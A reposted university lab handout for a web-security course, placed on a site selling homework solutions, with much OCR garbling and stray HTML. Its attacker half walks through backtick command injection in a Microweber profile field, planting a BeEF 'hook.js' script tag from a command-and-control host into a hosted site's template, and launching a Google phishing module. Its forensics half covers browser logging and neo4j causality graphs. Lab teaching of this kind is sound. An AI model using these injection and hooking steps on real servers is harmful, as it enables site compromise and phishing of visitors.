# cs6264-project-6-web-security
**TO GET THIS SOLUTION VISIT:** [CS6264 Project 6-Web Security](https://www.ankitcodinghub.com/product/cs6264-project-6-web-security/)


---

📩 **If you need this solution or have special requests:** **Email:** ankitcoding@gmail.com  
📱 **WhatsApp:** +1 419 877 7882  
📄 **Get a quote instantly using this form:** [Ask Homework Questions](https://www.ankitcodinghub.com/services/ask-homework-questions/)

*We deliver fast, professional, and affordable academic help.*

---

<h2>Description</h2>



<div class="kk-star-ratings kksr-auto kksr-align-center kksr-valign-top" data-payload="{&quot;align&quot;:&quot;center&quot;,&quot;id&quot;:&quot;126554&quot;,&quot;slug&quot;:&quot;default&quot;,&quot;valign&quot;:&quot;top&quot;,&quot;ignore&quot;:&quot;&quot;,&quot;reference&quot;:&quot;auto&quot;,&quot;class&quot;:&quot;&quot;,&quot;count&quot;:&quot;1&quot;,&quot;legendonly&quot;:&quot;&quot;,&quot;readonly&quot;:&quot;&quot;,&quot;score&quot;:&quot;5&quot;,&quot;starsonly&quot;:&quot;&quot;,&quot;best&quot;:&quot;5&quot;,&quot;gap&quot;:&quot;4&quot;,&quot;greet&quot;:&quot;Rate this product&quot;,&quot;legend&quot;:&quot;5\/5 - (1 vote)&quot;,&quot;size&quot;:&quot;24&quot;,&quot;title&quot;:&quot;CS6264 Project 6-Web Security&quot;,&quot;width&quot;:&quot;138&quot;,&quot;_legend&quot;:&quot;{score}\/{best} - ({count} {votes})&quot;,&quot;font_factor&quot;:&quot;1.25&quot;}">

<div class="kksr-stars">

<div class="kksr-stars-inactive">
            <div class="kksr-star" data-star="1" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="2" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="3" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="4" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="5" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>

<div class="kksr-stars-active" style="width: 138px;">
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>
</div>


<div class="kksr-legend" style="font-size: 19.2px;">
            5/5 - (1 vote)    </div>
    </div>
Note: Please make sure you have a GUI-enabled Linux OS (e.g., Ubuntu VM, WSL) to work on this project.

Table of contents

Disclaimers

Objectives

Checklist of Downloaded Project Files

Tasks

Role 1 – Attacker (45%)

Task 1.1: Exploit Discovery (15%)

Task 1.2: Compromise (30%)

Role 2 – Forensics Investigator (55%)

Task 2.1: Auditor Tool Development (25%)

Task 2.2: Attack Investigation (30%) Submission

<h1>Disclaimers</h1>
We are always looking to improve our homework assignments. If you see any errors, whether they are grammatical or technical, please report them on Ed Discussion. If anything is not clearly stated, please contact the TAs.

<h2>Objectives</h2>
With this project, you will be able to understand the big picture of how common web attacks can happen in the real world by playing two roles typically involved in the attack:

<ul>
<li>Attacker
<ul>
<li>Understand the concept of code injection and its potential impact on a web server.</li>
<li>Be able to compromise a web server by exploiting a code injection vulnerability and inserting attack payloads into websites.</li>
<li>Be familiarized with the use of browser exploitation framework <u>beef</u>.</li>
<li>Understand how common web attacks (e.g., phishing, drive-by download, page redirection) work.</li>
</ul>
</li>
<li>Forensic Investigator Z
<ul>
<li>Understand and be able to develop auditing tools for Chrome browser through <u>Chrome DevTools Protocol</u> to log browser activities.</li>
<li>Be able to construct causality graphs through <u>ne04</u>j based on logs collected.</li>
<li>Be able to write ne04j queries to identify attacks based on their patterns in the causality graph.</li>
</ul>
</li>
</ul>
<h2>Checklist of Downloaded Project Files</h2>
<ol>
<li>auditor The code template you will work on.</li>
<li>assignment_questionnaire . txt The questionnaire where you put your answers.</li>
</ol>
<h1>Tasks</h1>
Role 1 – Attacker (45%)

During reconnaissance, you found the following information.

<ul>
<li>Your opponent Bob hosts his websites on a cloud server.</li>
<li>The service provider runs all the customers’ services on the same server with no isolation (which is a bad practice!!!).</li>
<li>Another web service running by the service provider, named Microweber, has a known code injection vulnerability.</li>
</ul>
With these insights, you made a smart plan to mess with Bob and his clients.

<ul>
<li>Purchase a membership from the service provider to use the Microweber service, disguising yourself as a legitimate customer.</li>
<li>Exploit the known code injection vulnerability to take control of the server.</li>
<li>Insert malicious scripts into HTML files of Bob’s websites stealthily to mess up with Bob’s clients.</li>
<li>In this way, from the affected clients’ point of view, the attacks are from Bob’s website. As a result, Bob’s reputation gets undermined, and he loses clients as time goes by.</li>
</ul>
Without further due. Let’s get started!

After you have got the membership, you are permitted to register as an admin to further use the Microweber service.

<ol>
<li>Open the project page: htt<u>ps://cs6264.</u>g<u></u>g<u>atech.edu/</u></li>
<li>Log in with your GT account from the top right corner.</li>
<li>Click on the start button and you will see two docker containers started for you.</li>
</ol>
Note: if later you accidentally crash the services (likely to happen when you test out your code injection w/ illegal payload), you can always come back to this page, stop and start the services again to get a fresh environment.

<h2>Web Security Lab</h2>
Control your containers using these buttons

<table width="419">
<tbody>
<tr>
<td width="38">Start</td>
<td width="343"></td>
<td width="38">Stop</td>
</tr>
</tbody>
</table>
beef

Containcr

Status: created

Updated at: Nov. 5, 2023, 2:07 a.m. beef

web

Container

Status: created

Updated at: Nov. 5, 2023, 2:07 a.m. microweber&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; target

Bob’s webpage

<ol>
<li>Enter the Microweber, scroll all the way down, register a Microweber admin account (any credential is fine), and hit Install.</li>
</ol>
Login Information

Admin username&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Admin email

<table width="305">
<tbody>
<tr>
<td width="152">&nbsp;

<table width="144">
<tbody>
<tr>
<td width="144">Alice</td>
</tr>
</tbody>
</table>
</td>
<td width="152"></td>
</tr>
</tbody>
</table>
Admin password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Repeat password

Update nofitication

If checked, you will get update notifications when new version is avaiable.

Show advanced options

Install

<ol start="2">
<li>It will take a little time for the installation to complete.</li>
<li>1.3.2</li>
</ol>
(D Microweber

16%

Installing module DB: Rating

<ol start="6">
<li>Once installation is done, you will see your admin console page. Now it’s time to exploit!</li>
</ol>
Task 1.1: Exploit Discovery (15%)

Background

<ol>
<li>It is common for websites to take user inputs, store them in the database, and use them later. A simple example is an online service that:
<ol>
<li>Takes your username during registration</li>
<li>Stores the username you submitted in the database.</li>
<li>Retrieves the username from the database to display it on your profile page when you log in.</li>
</ol>
</li>
</ol>
What happens under the hood is that when you log in after registration, before the server delivers your profile page, it first constructs your profile page by dynamically filling the value of the username field in a profile page template with your username retrieved from the database.

<ol start="2">
<li>The process of server-side webpage construction allows code included in a webpage to be dynamically executed on the server, to dynamically get the data needed to complement the webpage. For example, a snippet of a code may query APIs to get the current server status and put it into a webpage to be delivered together with other information to users. Specifically, any content in the format will be treated as a code snippet and executed. For example, {Cpwd embedded in a webpage will be parsed as pwd and further executed as pwd command in the server’s shell to list all the files in the current directory during the construction of that page. Hint: Any characters</li>
</ol>
between two backticks , will be treated as a shell command on Linux. <u>Location of backtick on the ke</u>y<u>board.</u>

Combined with those two features, can we do something nasty? The answer is YES! As you probably have figured out, you can set your username as {C malicious code does something nasty’}} so that your “username” will be parsed and executed as code and do nasty stuff during the profile page construction on the server. A common practice to prevent this type of attack is to sanitize user inputs by turning them into inexecutable strings. However, sanitizations are not always correctly implemented. The Microweber website is an example — one of the user input fields lacks proper sanitization and is vulnerable to code injection attacks.

Steps:

<ol>
<li>After installation, you will see your profile page. To help you narrow down the search space, we give you a hint that the injection point is somewhere in the profile information. Go to Users and click on Edit profile.</li>
</ol>
&lt; Back

Dashboard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Users

Website

Manage your users

<table width="451">
<tbody>
<tr>
<td width="89">Shop</td>
<td width="260">You are able to create and manage users, groups and roles.</td>
<td width="102">o</td>
</tr>
<tr>
<td width="89">Modules</td>
<td width="260">Working with users</td>
<td width="102"></td>
</tr>
<tr>
<td width="89"></td>
<td width="260">Create and manage users</td>
<td width="102">You are logged in as</td>
</tr>
</tbody>
</table>
User

<table width="359">
<tbody>
<tr>
<td width="207"></td>
<td width="152">&nbsp;

<table width="44">
<tbody>
<tr>
<td width="44">Edit profile</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
Marketplace

Step 2

Settings

Users Step 1

Website Builder by Microweber Version: 1.3.2

<ol>
<li>Q) Log out</li>
<li>Then you will see the following user information. Try to set an input field with an exploit string (you can choose any command you like, here we use pwd as an example) and save. Note: here the Username input field is just for demonstration purposes. You should choose another field.</li>
</ol>
Edit user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Save

o

user image

Fill in the fields to create a new user

Username

Password Change Password

Personal data of the uÉer

First Name

Last Name

<ol start="3">
<li>Then go back or refresh the Users page and see if you observe anything interesting. If you see the output of the executed pwd command: /var/www/html in the Users page, congrats! You have found an injection point!</li>
</ol>
&lt; Back

Users

Manage your users

<table width="480">
<tbody>
<tr>
<td width="387">You are able to create and manage users, groups and roles.</td>
<td width="93">o</td>
</tr>
<tr>
<td width="387">Working with users</td>
<td width="93">You are 10 ed in as</td>
</tr>
</tbody>
</table>
Create and manage users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /var/www/html

<table width="132">
<tbody>
<tr>
<td width="66"></td>
<td width="66">&nbsp;

<table width="65">
<tbody>
<tr>
<td width="65">Manage users</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
Edit profile

<ul>
<li>Note 1: You should see the execution result on this Users page, as opposed to the Edit user page in the last step (which only show partial result).</li>
<li>Note 2: Make sure the Users page is reloaded after you save your exploit input. The injected command will not get executed until the Users page is reloaded.</li>
</ul>
<ol start="4">
<li>Now modify your injected command to get your hash stored in</li>
</ol>
/tmp/secret_l. txt on the server, see the example below. Submit this hash string to QI.I in the questionnaire. (Note: If you see two identical hashes, just submit one. This may happen due to that the injected data field is accessed twice during page construction.)

o

You are logged in as

b06c8b2c83b223834d18795da692f699fb153195f7e3c800f1721 fcbe87c6cf533b7d3456f990c058786f48edffca9588cb41fOa840

3917b6d85f99431728f78

User

Edit profile

<table width="297">
<tbody>
<tr>
<td width="88">Rubric</td>
<td width="160"></td>
<td width="49"></td>
</tr>
<tr>
<td width="88">Question</td>
<td width="160">Deliverable</td>
<td width="49">Credits</td>
</tr>
<tr>
<td width="88">QI.I</td>
<td width="160">Secret hash</td>
<td width="49">15 %</td>
</tr>
</tbody>
</table>
Task 1.2: Compromise (30%)

Description

The ability to run a command on the web server implies that you may do more on the web server, including modifying Bob’s website. In this task, your goal is to insert a malicious script payload into a template HTML file used by Bob’s website. Webpages Bob’s website imports the infected template, hence being infected as well. In this way, Bob’s clients get compromised when visiting his webpages.

<h3>Steps</h3>
<ol>
<li>Locate the directory of Bob’s website and assets directory of clients.
<ul>
<li>Clients’ directories are normally organized together under the same parent folder, just like / home in Linux. To help protect the client’s privacy, the service provider names a customer’s assets directory with the MD5 hash of the client’s name (e.g., MD5(“Bob”). Be careful about the letter cases.) instead of the client’s actual name (i.e., Bob). Your goal is to locate the client assets directory (parent directory of Bob’s directory) and submit it to QI.2.1 in the questionnaire. Note: you should submit the exact directory name, NOT the directory path (see the example below). Any additional</li>
</ul>
</li>
</ol>
characters (e.g., ) in your submission will cause a mismatch and lead to O pts during autograding.

<ul>
<li>Hints:</li>
<li>Many online MD5 generators are available.</li>
</ul>
0 You can use the Linux find command to search for Bob’s directory. You can use (root location) or (parent folder) as the search location to help you.

o In the example below, your answer submitted to QI.2.1 should be

clients assets

$ find / -iname client_md5

Result: /xx/xx/clients assets/ client md5

<ol start="2">
<li>Find the best template file to insert the malicious script payload.
<ul>
<li>Most modern websites follow a certain organized structure — frequently used resources are put into templates for efficient reuse. For example, the same navigation bar may be used repeatedly throughout many pages of a website. Therefore, a website admin can save the navigation bar as a template in navigation . html and have those pages that need to display the navigation bar import navigation . html . From the attacker’s perspective, finding and modifying such a template is optimum as this modification is minimal yet impactful. Your goal is to figure out which template HTML under the templates directory in Bob’s website directory makes the most sense to insert the malicious script payload into. Submit your answer (in the format of xxx . html ) to QI.2.2 in the questionnaire. Note: make sure your spelling is correct. Incorrect file name by any means leads to O pts for this task.</li>
<li>Hints:</li>
<li>Think about what type of data you are trying to insert into the</li>
<li>The correct template file has a hint at the beginning of the content indicating you have found the correct one.</li>
<li>You don’t need to check files in the sub-directories. All you need to do is examine the HTML files right under the templates</li>
</ul>
</li>
<li>Insert the malicious script into the target.
<ul>
<li>Once you have found the best template file, the next step is to insert the malicious payload. A smart practice attackers typically follow is that instead of deploying a one-time attack, they install a remote hook on the victim’s page/machine that can connect to an attacker-owned Control and Command (C&amp;C) server. When the remote hook gets triggered (the infected webpage is open), it constantly emits heartbeats to the C&amp;C server to notify the attacker a zombie is online. Then the attacker can freely issue any preconfigured attack commands to the zombie.</li>
<li>In this project:</li>
<li>We use BeEF as the C&amp;C console, which you can find on the project page. The username and password are both: beef_for_cs6264</li>
<li>The remote hook to install in the template HTML should contain the following.</li>
</ul>
</li>
</ol>
&lt;script src=”http://cs6264.gtisc . gatech . edu: YOUR_BEEF_PORT / hook.js”&gt;&lt;/script&gt;

cs6264.gtisc.gatech.ed 39069 ui/panel

<table width="327">
<tbody>
<tr>
<td width="7"></td>
<td width="320">&nbsp;

<table width="318">
<tbody>
<tr>
<td width="106">Getting Started</td>
<td width="106">Logs</td>
<td width="105">Zombies</td>
</tr>
<tr>
<td colspan="3" width="318">=eEF

THE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXPLOITATION FRAMEWORK PROJECT

Official website:
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
Find your BeEF port number here.

Hints:

<ol>
<li>The src property in the &lt;script&gt; tag has to be present at a minimum to make it work.</li>
<li>The dynamically allocated port number may change each time you start a new container. Make sure you use the up-to-date port number.</li>
</ol>
<ul>
<li>Your goal is to insert the remote hook above through code injection techniques into the template file you found. In this way, Bob’s webpage gets infected when importing the infected template file.</li>
<li>Hint: <sup>1</sup>k” and in user inputs are commonly sanitized by the server (try it out and see what happens!), which means you probably cannot include them in your command. You can use any solution as long as it does the work (Find and replace? Download from network? Or more?). You are encouraged to look up online resources and learn along the way of trying various possible solutions.</li>
<li>To verify If your attack is successful, visit Bob’s webpage like a normal client. When a user opens an infected webpage, the IP of the connected victim (which is you in this test) will appear in BeEF’s console.</li>
</ul>
wcb

Container

Status: created Updated at: Nov. 5, 2023, 2:07 a.m. microweber&nbsp; target

<table width="322">
<tbody>
<tr>
<td width="191">Hooked Browsers</td>
<td colspan="4" width="130">Getting Started</td>
</tr>
<tr>
<td rowspan="2" width="191">Online Browsers u a 10.211.55.10

Y 10.211.55.2
</td>
<td colspan="2" width="48">Details</td>
<td width="40">Logs</td>
<td width="42">Commands</td>
</tr>
<tr>
<td width="30"></td>
<td colspan="3" width="100">Type</td>
</tr>
<tr>
<td width="189"></td>
<td width="30"></td>
<td width="18"></td>
<td width="40"></td>
<td width="46"></td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td width="426"></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<u>Bob’s web</u>page

<table width="136">
<tbody>
<tr>
<td width="28">9</td>
<td width="62">Command</td>
<td width="46">Hooke</td>
</tr>
<tr>
<td width="28">8</td>
<td width="62">Command</td>
<td width="46">Hooke</td>
</tr>
<tr>
<td width="28">7</td>
<td width="62">Command</td>
<td width="46">Hooke</td>
</tr>
<tr>
<td width="28">6</td>
<td width="62">Command</td>
<td width="46">Hooke</td>
</tr>
<tr>
<td width="28">4</td>
<td width="62">Zombie</td>
<td width="46">10.211</td>
</tr>
<tr>
<td width="28">3</td>
<td width="62">Zombie</td>
<td width="46">10.211</td>
</tr>
</tbody>
</table>
Event

Offline Browsers

&nbsp;

<ol start="4">
<li>Issue an attack</li>
</ol>
&nbsp;

<ul>
<li>Select the victim (you) under the Online Browsers , then issue Commands</li>
</ul>
Social Engineering Google Phishing attack and observe what happens to Bob’s webpage.

<table width="596">
<tbody>
<tr>
<td width="34">Details</td>
<td width="29">Logs</td>
<td width="58">Commands</td>
<td width="25">Proxy</td>
<td width="40">XssRays</td>
<td width="44">Network</td>
<td colspan="2" width="364"></td>
</tr>
<tr>
<td colspan="3" width="122">-Module Tree</td>
<td colspan="3" width="110">Module Results History</td>
<td colspan="2" width="364">Google Phishing</td>
</tr>
<tr>
<td colspan="3" width="122">phis</td>
<td width="25"></td>
<td width="40">date</td>
<td width="44">label</td>
<td rowspan="2" width="58">Description:

Id:

XSS hook URI:

Gmail logout interval (ms):

Redirect delay (ms):
</td>
<td rowspan="2" width="307">This plugin uses an image tag to XSRF the logout button of Gmail. Continuously the user is logge another tab). Additionally it will show the Google favicon and a Gmail phishing page (although ty

11

<table width="293">
<tbody>
<tr>
<td width="293">http://cs6264.gtisc.gatech.edu:39069/demos/plain.html</td>
</tr>
<tr>
<td width="293">10000</td>
</tr>
<tr>
<td width="293">1000</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td colspan="3" width="122">Social Engineering (1 ) e Google Phishing</td>
<td colspan="3" width="110">o 2023-11- command 05 02:33 1

1&nbsp;&nbsp; 2023-11-&nbsp;&nbsp;&nbsp; command

05 17:26&nbsp; 2
</td>
</tr>
</tbody>
</table>
<ul>
<li>If the attack succeeds, you will see that the original page turns into a phishing page with a hash string at the bottom. Submit this hash to QI.2.4 in the questionnaire.</li>
</ul>
<table width="549">
<tbody>
<tr>
<td width="60">Google</td>
<td width="299">Google Mail</td>
<td width="190">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; New to Google Mail? CREATE AN ACCOUNT</td>
</tr>
<tr>
<td width="60"></td>
<td width="299">A Google approach to email.</td>
<td width="190">Sign in</td>
</tr>
<tr>
<td width="60"></td>
<td width="299">Google Mail is built on the idea that email can be more intuitive, efficient, and useful. And maybe even fun. After all, Google Mail has:</td>
<td width="190">Username</td>
</tr>
<tr>
<td width="60"></td>
<td width="299">Lots of space

Over 2757.272164 megabytes (and counting) of free storage.

Less spam
</td>
<td width="190">Password</td>
</tr>
<tr>
<td width="60"></td>
<td width="299">Keep unwanted messages out of your inbox.</td>
<td width="190">Sign in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Stay signed in</td>
</tr>
<tr>
<td width="60"></td>
<td width="299">Mobile access

Get Google Mail on your mobile phone. Learn more
</td>
<td width="190">Can’t access your account?</td>
</tr>
</tbody>
</table>
About Google Mail New features! Switch to Google Mail Create an account

Take Google Mail to work with Google Apps for Business

Love Google Mail, but looking for a custom email address for your company?

Get business email, calendar, and online docs Learn more

2016 Google Google Mail for work Terms &amp; privacy Help f4bc7d6edccec46c71a15f5b5cf4bcbaObbbb2b2936641cae360bf7d04ea65c5c27edb49731c57df52449ef3fc14eb59bcfe5d4d9d9f546c81b23fa9f24840fa

Rubric

<table width="414">
<tbody>
<tr>
<td width="120">Question</td>
<td width="245">Deliverable</td>
<td width="49">Credits</td>
</tr>
<tr>
<td width="120">QI.2.1</td>
<td width="245">Client asset directory</td>
<td width="49"></td>
</tr>
<tr>
<td width="120">QI.2.2</td>
<td width="245">Best template file to compromise</td>
<td width="49"></td>
</tr>
<tr>
<td width="120">QI.2.3</td>
<td width="245">Hash on the phishing page</td>
<td width="49">20%</td>
</tr>
</tbody>
</table>
<h2>Role 2 – Forensics Investigator (55%)</h2>
Congratulations! At this point, you have successfully deployed and tested the attack. Now it’s time to look at this story from the point of view of another crucial role — the forensics investigator. As a forensics investigator, your job is to find the evidence of any attacks that happened to a victim. To approach this goal, you come up with the following plan:

<ol>
<li>Develop an auditing tool to log browser activities which may include the evidence of attacks.</li>
<li>Construct a causality graph by connecting discrete information pieces from the raw logs.</li>
<li>Find evidence of attacks in the causality graph based on patterns of attacks.</li>
</ol>
Task 2.1: Auditor Tool Development (25%)

Description

In the first step, you need to develop a handy tool to log and model the activities happening in the browser. To help take away the engineering burden from you, we have helped you implement most of the auditing tool (however, you are encouraged to go through all the code), so that you can focus more on learning the concepts and philosophy of modeling browser activities we provide in the supplementary document.

Steps:

<ol>
<li>Read the supplementary document to understand what major activities happening in the browser and the rationale regarding how to model them.</li>
</ol>
<ul>
<li>Important note: We recommend reading the supplementary from the start to the end. Doing this not only helps you make the best of this project even though only part of it is needed to complete the task we give you.</li>
</ul>
<ol start="2">
<li>With the knowledge you gained from step 1, complete the function handle_download_begin ( ) in event_handler . py . For testing, you can trigger the download event by visiting a page with download functionality. For example, any GitHub repo htt<u>ps://</u>g<u>com/fate0/</u>ay<u>chrome/tree/master</u>. Or you can use the Fake Notification attack involving file downloading from BeEF described in Task 2.2.</li>
</ol>
pychrome <u>Public&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </u>@ Watch 12

branches&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 tags

<table width="573">
<tbody>
<tr>
<td colspan="2" width="164"></td>
<td colspan="2" width="154"></td>
